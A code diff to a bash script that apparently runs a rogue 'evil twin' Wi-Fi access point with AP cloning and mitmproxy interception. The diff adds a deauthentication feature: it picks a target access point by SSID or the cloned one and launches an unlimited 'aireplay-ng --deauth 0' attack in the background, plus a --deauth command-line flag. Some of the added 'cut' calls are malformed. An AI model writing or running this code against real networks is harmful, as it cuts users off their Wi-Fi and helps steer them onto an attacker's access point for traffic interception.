@@ -844,6 +844,87 @@ enable_packet_capture(){
     fi
 }
 
+configure_deauth() {
+    log "Configuring deauthentication attacks..."
+    if [[ $INTERACTIVE_MODE == true ]]; then
+        if [[ -z "${ARG[DEAUTH]}" ]]; then
+            read -r -p "Enable deauthentication attacks? (y/N): " enable
+            if [[ "${enable}" =~ ^[Yy]$ ]]; then
+                DEFAULTS[DEAUTH]=true
+            elif [[ "${enable}" =~ ^[Nn]$ ]]; then
+                DEFAULTS[DEAUTH]=false
+            fi
+        fi
+    fi
+
+    [[ "${DEFAULTS[DEAUTH]}" == true ]] || return
+    log "Deauthentication attacks enabled."
+
+    local target_mac
+    local target_ssid
+
+    if  [[ "${DEFAULTS[CLONE]}" == false ]]; then
+        if [[ $INTERACTIVE_MODE == true ]]; then
+            if [[ -z "${ARG[DEAUTH_SSID]}" ]]; then
+                mapfile -t available_aps < <(get_wifi_ssids "${DEFAULTS[INTERFACE]}")
+                if (( ${#available_aps[@]} )); then
+                    target_ssid=$(select_from_list "Select target AP for deauth:" "${available_aps[@]}")
+                    target_mac=$(get_ap_info "${target_ssid}" "${DEFAULTS[INTERFACE]}" | cut -d -f3 -s '|')
+                    DEFAULTS[DEAUTH_MAC]="${target_mac}"
+                else
+                    echo "No available APs found."
+                    return 1
+                fi
+            else
+                target_ssid="${DEFAULTS[DEAUTH_SSID]}"
+                target_mac=$(get_ap_info "${target_ssid}" "${DEFAULTS[INTERFACE]}" | cut -d -f3 -s '|')
+                if [[ -z "${target_mac}" ]]; then
+                    error "No AP found with SSID '${target_ssid}'"
+                    return 1
+                fi
+            fi
+        else
+            if [[ -n "${ARG[DEAUTH_SSID]}" ]]; then
+                target_ssid="${DEFAULTS[DEAUTH_SSID]}"
+                target_mac=$(get_ap_info "${target_ssid}" "${DEFAULTS[INTERFACE]}" | cut -d -f3 -s '|')
+                if [[ -z "${target_mac}" ]]; then
+                    error "No AP found with SSID '${target_ssid}'"
+                    return 1
+                fi
+                DEFAULTS[DEAUTH_MAC]="${target_mac}"
+            else
+                warn "No target SSID specified for deauth, skipping."
+                return 0
+            fi
+        fi
+    else
+        target_ssid="${DEFAULTS[CLONE_SSID]}"
+        target_mac=$(get_ap_info "${target_ssid}" "${DEFAULTS[INTERFACE]}" | cut -d -f3 -s '|')
+        if [[ -z "${target_mac}" ]]; then   
+            error "No AP found with SSID '${target_ssid}'"
+            return 1
+        fi
+        DEFAULTS[DEAUTH_MAC]="${target_mac}"
+    fi
+
+    if [[ -n "${DEFAULTS[DEAUTH_MAC]}" ]]; then
+        log "Selected target AP for deauth: ${DEFAULTS[DEAUTH_SSID]} (${DEFAULTS[DEAUTH_MAC]})"
+        enable_deauth
+    fi
+}
+
+enable_deauth() {
+    if [[ -z "${DEFAULTS[DEAUTH_MAC]}" ]]; then
+        error "No target MAC address specified for deauth"
+        return 1
+    fi
+
+    log "Starting deauthentication attack on ${DEFAULTS[DEAUTH_MAC]} (${DEFAULTS[DEAUTH_SSID]})"
+    
+    aireplay-ng --deauth 0 -a "${DEFAULTS[DEAUTH_MAC]}" "${DEFAULTS[INTERFACE]}" &
+    PIDS+=($!)
+}
+
 configure_proxy() {
     local proxy_host="${DEFAULTS[PROXY_HOST]}"
     local proxy_port="${DEFAULTS[PROXY_PORT]}"
@@ -1471,6 +1552,19 @@ main() {
                 ARG[MONITOR_MODE]=1
                 shift
                 ;;
+            --deauth)
+                if [[ -n "${2:-}" ]]; then
+                    DEFAULTS[DEAUTH_SSID]="$2"
+                    ARG[DEAUTH_SSID]=1
+                    DEFAULTS[DEAUTH]=true
+                    ARG[DEAUTH]=1
+                    shift 2
+                else
+                    DEFAULTS[DEAUTH]=true
+                    ARG[DEAUTH]=1
+                    shift
+                fi                
+                ;;
             --mitmlocal)
                 DEFAULTS[MITM_LOCATION]="LOCAL"
                 DEFAULTS[PROXY_BACKEND]="mitmproxy"
@@ -1564,6 +1658,7 @@ main() {
     configure_hostapd
     configure_dhcp
 
+    configure_deauth
     configure_monitor_mode
     configure_internet_sharing
     configure_proxy
